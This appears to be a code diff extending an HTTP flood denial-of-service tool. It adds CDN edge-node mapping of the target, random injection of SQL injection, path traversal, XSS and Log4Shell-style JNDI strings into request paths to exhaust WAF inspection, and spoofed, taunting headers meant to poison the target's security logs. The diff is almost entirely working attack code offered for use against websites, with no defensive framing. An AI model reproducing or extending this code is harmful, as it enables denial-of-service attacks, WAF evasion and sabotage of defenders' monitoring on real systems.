@@ -1185,6 +1185,75 @@ class AsyncHttpFlood(Thread):
                 return f"http://{p_str}"
         return None
     
+    def _chaos_edge_node_detection(self):
+        """Map the specific geographic WAF edge server serving our connection.
+        By tracking headers like CF-RAY or X-Amz-Cf-Id, we know exactly routing geography."""
+        intel = self._chaos_intel
+        if intel["total_executions"] != 10:
+            return
+            
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            with urllib.request.urlopen(req, timeout=3) as resp:
+                headers = dict(resp.headers)
+                # Cloudflare Ray ID (e.g., 85d1...-SIN for Singapore)
+                cfray = headers.get('CF-RAY', '')
+                if '-' in cfray:
+                    intel["geo_edge_nodo"] = cfray.split('-')[-1].upper()
+                    print(f"{bcolors.OKCYAN}[CHAOS GEO-ROUTING] Data Traffic mapped to Edge Node: {intel['geo_edge_nodo']}{bcolors.RESET}")
+                elif 'X-Amz-Cf-Id' in headers:
+                    intel["geo_edge_nodo"] = "AWS-CloudFront"
+                    print(f"{bcolors.OKCYAN}[CHAOS GEO-ROUTING] Mapped to AWS Edge Infrastructure{bcolors.RESET}")
+                elif 'X-Varnish' in headers:
+                    intel["geo_edge_nodo"] = "Fastly-Cache"
+        except: pass
+
+    def _chaos_generate_mutant_payload(self, base_path):
+        """Zero-Day Heuristics. Embeds fake severe vulnerabilities into the request.
+        WAF spends massive compute power verifying SQLi/XSS/RCE signatures.
+        When hammered with these, the WAF inspection engine queues up and crashes."""
+        intel = self._chaos_intel
+        intel["zero_day_mutations_sent"] += 1
+        
+        mutant = randchoice(intel["log_poisoning_payloads"])
+        from urllib.parse import quote
+        
+        # Decide where to inject the fake vulnerability
+        injection_point = randint(1, 3)
+        if injection_point == 1:
+            # Query parameter
+            sep = "&" if "?" in base_path else "?"
+            return f"{base_path}{sep}q={quote(mutant)}"
+        elif injection_point == 2:
+            # Path Traversal illusion
+            return f"/..././.../.{base_path}?vuln={quote(mutant)}"
+        else:
+            # Fake API endpoint
+            return f"/api/v1/user/{quote(mutant)}/{base_path.lstrip('/')}"
+            
+    def _chaos_psy_ops_headers(self, headers_str):
+        """Psychological Warfare / Log Poisoning.
+        Adds ridiculous but valid HTTP headers that corrupt Splunk/ElasticSearch 
+        indexing on the target's SOC dashboard."""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 200 == 0:
+            intel["psy_ops_active"] = True
+            
+        if not intel.get("psy_ops_active"):
+            return headers_str
+            
+        rs = ProxyTools.Random.rand_str
+        psy_headers = (
+            f"X-Forwarded-For: 127.0.0.1, 10.0.0.1, 192.168.1.{randint(1,255)}\r\n"
+            f"X-Hacker-Warning: You are being targeted by CHAOS Engine\r\n"
+            f"X-Requested-With: XMLHttpRequest\r\n"
+            f"True-Client-IP: {randint(1,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}\r\n"
+            f"Accept-Language: en-US,en;q=0.9,alien;q=0.8,sql_{rs(4)};q=0.5\r\n"
+        )
+        return psy_headers + headers_str
+
     def _chaos_generate_battering_ram(self):
         """Generate a Battering Ram payload - highly obfuscated, nested JSON.
         Designed to exhaust WAF regex engines (ReDoS) or bypass deep inspection."""
@@ -2000,6 +2069,11 @@ class HttpFlood(Thread):
             path = self.get_random_target_path()
         # Apply organic query fuzzing to dynamic paths bypass logic
         path = self._chaos_fuzz_query(path)
+        
+        # 15% chance to mutate the path into a Zero-Day Heuristic WAF trap
+        if randint(1, 100) <= 15:
+            path = self._chaos_generate_mutant_payload(path)
+            
         safe_path = path if path.startswith("/") else f"/{path}"
         url = f"{self._target.scheme}://{target_domain}{safe_path}"
 
@@ -2932,6 +3006,13 @@ class HttpFlood(Thread):
         "botnet_nodes_simulated": 0,      # Number of distinct IPs we are mimicking
         "asn_diversity_score": 0,         # Autonomous System Number diversity of proxies
         "fingerprint_pool": [],           # Complete JA3 + HTTP/2 + Header fingerprints
+        "zero_day_mutations_sent": 0,     # Tracking complex DPI-breaking payloads
+        "geo_edge_nodo": "UNKNOWN",       # The specific WAF Edge server handling us
+        "psy_ops_active": False,          # Corrupting logs with weird HTTP standards
+        "log_poisoning_payloads": [       # Random fake vulnerability strings to distract WAF
+            "' OR '1'='1", "1; DROP TABLE users", "../../../etc/passwd",
+            "<script>alert(1)</script>", "${jndi:ldap://fake.server/Exploit}"
+        ],
     }
     
     # ========================================================================
@@ -3741,12 +3822,17 @@ class HttpFlood(Thread):
             http_method = randchoice(["HEAD", "OPTIONS", "PATCH", "PUT", "DELETE"])
             referer = self._chaos_get_smart_referer()
             
-            payload = (f"{http_method} {path} HTTP/1.1\r\n"
-                       f"Host: {self._target.authority}\r\n"
-                       f"User-Agent: {profile.get('User-Agent', randchoice(self._useragents))}\r\n"
-                       f"Accept: {profile.get('Accept', '*/*')}\r\n"
-                       f"Referer: {referer}\r\n"
-                       f"Connection: keep-alive\r\n")
+            # Generate base headers
+            headers_block = (f"Host: {self._target.authority}\r\n"
+                             f"User-Agent: {profile.get('User-Agent', randchoice(self._useragents))}\r\n"
+                             f"Accept: {profile.get('Accept', '*/*')}\r\n"
+                             f"Referer: {referer}\r\n"
+                             f"Connection: keep-alive\r\n")
+            
+            # Corrupt headers with PsyOps to break Sysadmin logs
+            headers_block = self._chaos_psy_ops_headers(headers_block)
+            
+            payload = f"{http_method} {path} {"HTTP/2.0" if randint(1,4)==1 else "HTTP/1.1"}\r\n" + headers_block
             
             # Add body for PATCH/PUT
             if http_method in ("PATCH", "PUT"):
@@ -5102,6 +5188,9 @@ class HttpFlood(Thread):
         if intel["total_executions"] == 4:
             self._chaos_generate_fingerprints()
             
+        # Phase 1.11.2.5: TOPOLOGY EDGE MAPPING
+        self._chaos_edge_node_detection()
+
         # Phase 1.11.3: SHADOW PROTOCOL CHECK
         self._chaos_shadow_protocol()
         
@@ -5424,6 +5513,11 @@ class HttpFlood(Thread):
                 if nodes > 0:
                     print(f"  Botnet      : {nodes} Nodes Mimicked | ASN Diversity: {asn} subnets")
                     print(f"  Protocol    : Shadow Phase: {shadow_str} | WAF Bypass Vectors: Synchronized")
+                
+                edge = intel.get("geo_edge_nodo", "UNKNOWN")
+                mutz = intel.get("zero_day_mutations_sent", 0)
+                if edge != "UNKNOWN" or mutz > 0:
+                    print(f"  Cyber War   : Geo-Edge: {bcolors.OKBLUE}[{edge}]{bcolors.RESET} | Zero-Day Mutations Fired: {mutz} (DPI Exhaustion)")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
